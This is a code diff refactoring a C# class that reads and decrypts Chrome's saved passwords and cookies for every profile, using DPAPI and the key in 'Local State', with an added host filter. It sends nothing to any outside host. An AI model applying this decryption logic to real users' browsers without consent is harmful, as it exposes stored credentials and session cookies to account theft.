@@ -22,7 +22,7 @@ namespace dao
     /// <summary>
     /// http://raidersec.blogspot.com/2013/06/how-browsers-store-your-passwords-and.html#chrome_decryption
     /// </summary>
-    class ChromeModel
+    class BaseChrome
     {
         public static string GetAppDataLocalPath()
         {
@@ -36,24 +36,30 @@ namespace dao
 
         public string UserDataPath { get; set; }
 
-        public ChromeModel(string userDataPath)
+        private string _enckey = null;
+        public string EncKey
         {
-            this.UserDataPath = userDataPath;
+            get
+            {
+                if (_enckey == null)
+                {
+                    try
+                    {
+                        //string encKey = File.ReadAllText(Path.Combine(GetLocalAppDataPath(), @"Google\Chrome\User Data\Local State"));
+                        string encKey = File.ReadAllText(Path.Combine(UserDataPath, @"Local State"));
+                        _enckey = JObject.Parse(encKey)["os_crypt"]["encrypted_key"].ToString();
+                    }
+                    catch
+                    {
+                    }
+                }
+                return _enckey;
+            }
         }
 
-        private string GetEncKey()
+        public BaseChrome(string userDataPath)
         {
-            try
-            {
-                //string encKey = File.ReadAllText(Path.Combine(GetLocalAppDataPath(), @"Google\Chrome\User Data\Local State"));
-                string encKey = File.ReadAllText(Path.Combine(UserDataPath, @"Local State"));
-                encKey = JObject.Parse(encKey)["os_crypt"]["encrypted_key"].ToString();
-                return encKey;
-            }
-            catch
-            {
-                return null;
-            }
+            this.UserDataPath = userDataPath;
         }
 
 #if USE_System_Data_Sqlite
@@ -84,7 +90,7 @@ namespace dao
                                         String pass = Encoding.UTF8.GetString(ProtectedData.Unprotect(GetBytes(reader, 2), null, DataProtectionScope.CurrentUser));
                                         String url = reader.GetString(0);
                                         String user = reader.GetString(1);
-                                        if (!String.IsNullOrWhiteSpace(url) && !String.IsNullOrWhiteSpace(user))
+                                        if (!String.IsNullOrWhiteSpace(url) && user!=null)
                                         {
                                             result.Add(new PassModel()
                                             {
@@ -128,7 +134,7 @@ namespace dao
             }
         }
 #else
-        public IEnumerable<PassModel> ReadPassword(string profileName, string logindataPath)
+        public IEnumerable<PassModel> ReadPasswordProfile(string profileName, string logindataPath, string host = null)
         {
             var result = new List<PassModel>();
             if (File.Exists(logindataPath))
@@ -147,9 +153,10 @@ namespace dao
                         try
                         {
                             String url = SQLDatabase.GetValue(i, "origin_url");
+                            if (host != null && url != host) continue;
                             String user = SQLDatabase.GetValue(i, "username_value");
                             String pass = Decrypt(SQLDatabase.GetValue(i, "password_value"));
-                            if (!String.IsNullOrEmpty(url) && !String.IsNullOrEmpty(user))
+                            if (!String.IsNullOrEmpty(url) && (!String.IsNullOrEmpty(user) || !String.IsNullOrEmpty(pass)))
                             {
                                 result.Add(new PassModel()
                                 {
@@ -172,18 +179,29 @@ namespace dao
             return result;
         }
 
-        private static string Decrypt(string EncryptedData)
+        private string Decrypt(string encryptedText)
         {
-            if (EncryptedData == null || EncryptedData.Length == 0)
+            if (encryptedText == null || encryptedText.Length == 0)
             {
                 return null;
             }
-            byte[] decryptedData = ProtectedData.Unprotect(System.Text.Encoding.Default.GetBytes(EncryptedData), null, DataProtectionScope.CurrentUser);
-            return Encoding.UTF8.GetString(decryptedData);
+            byte[] encryptedData = System.Text.Encoding.Default.GetBytes(encryptedText);
+            try
+            {
+                byte[] decryptedData = ProtectedData.Unprotect(encryptedData, null, DataProtectionScope.CurrentUser);
+                return Encoding.UTF8.GetString(decryptedData);
+            }
+            catch
+            {
+                var decodedKey = System.Security.Cryptography.ProtectedData.Unprotect(Convert.FromBase64String(EncKey).Skip(5).ToArray(), null, System.Security.Cryptography.DataProtectionScope.LocalMachine);
+                var plainText = _decryptWithKey(encryptedData, decodedKey, 3);
+                return plainText;
+            }
+
         }
 #endif
 
-        public IEnumerable<PassModel> ReadPassword()
+        public IEnumerable<PassModel> ReadPassword(string host = null)
         {
             var result = new List<PassModel>();
             try
@@ -201,7 +219,7 @@ namespace dao
                 foreach (String profileName in profileList)
                 {
                     String profilePath = $"{UserDataPath}\\{profileName}\\Login Data";
-                    result.AddRange(ReadPassword(profileName, profilePath));
+                    result.AddRange(ReadPasswordProfile(profileName, profilePath, host));
                 }
             }
             catch (Exception ex)
@@ -211,7 +229,7 @@ namespace dao
             return result;
         }
 
-        public IEnumerable<Cookie> ReadsCookieFile(String profileName, String cookiePath, String host)
+        public IEnumerable<Cookie> ReadCookieProfile(String profileName, String cookiePath, String host)
         {
             var result = new List<Cookie>();
             if (File.Exists(cookiePath))
@@ -240,7 +258,6 @@ namespace dao
                                 cmd.Parameters.Add(prm);
                                 cmd.CommandText = "SELECT host_key,name,encrypted_value FROM cookies WHERE host_key = @hostName";
                             }
-                            string encKey = GetEncKey();
                             using (var reader = cmd.ExecuteReader())
                             {
                                 if (reader.HasRows)
@@ -265,7 +282,7 @@ namespace dao
                                         {
                                             try
                                             {
-                                                var decodedKey = System.Security.Cryptography.ProtectedData.Unprotect(Convert.FromBase64String(encKey).Skip(5).ToArray(), null, System.Security.Cryptography.DataProtectionScope.LocalMachine);
+                                                var decodedKey = System.Security.Cryptography.ProtectedData.Unprotect(Convert.FromBase64String(EncKey).Skip(5).ToArray(), null, System.Security.Cryptography.DataProtectionScope.LocalMachine);
                                                 var plainText = _decryptWithKey(encryptedData, decodedKey, 3);
                                                 result.Add(new Cookie()
                                                 {
@@ -313,7 +330,7 @@ namespace dao
                 foreach (String profileName in profileList)
                 {
                     String profilePath = $"{UserDataPath}\\{profileName}\\{filename}";
-                    result.AddRange(ReadsCookieFile(profileName, profilePath, host));
+                    result.AddRange(ReadCookieProfile(profileName, profilePath, host));
                 }
             }
             catch (Exception ex)
